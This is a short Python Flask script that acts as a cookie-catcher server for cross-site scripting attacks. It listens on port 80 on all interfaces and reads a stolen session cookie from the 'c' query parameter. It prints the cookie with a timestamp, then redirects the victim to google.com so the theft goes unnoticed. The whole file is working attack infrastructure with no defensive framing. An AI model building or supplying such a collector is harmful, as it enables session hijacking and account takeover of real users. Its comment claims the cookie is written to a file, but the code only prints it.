from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__) # Create instance

@app.route('/') # our home URL
def cookie():

	# Grab cookie and write it to a file
	
	cookie = request.args.get('c')
	output = (cookie + ' ' + str(datetime.now()) + '\n')
	print(output)
	# redirect user to google
	return redirect("https://google.com/")

if __name__ == "__main__":
	app.run(host = '0.0.0.0', port=80) # 0.0.0.0 - listen on all IPs
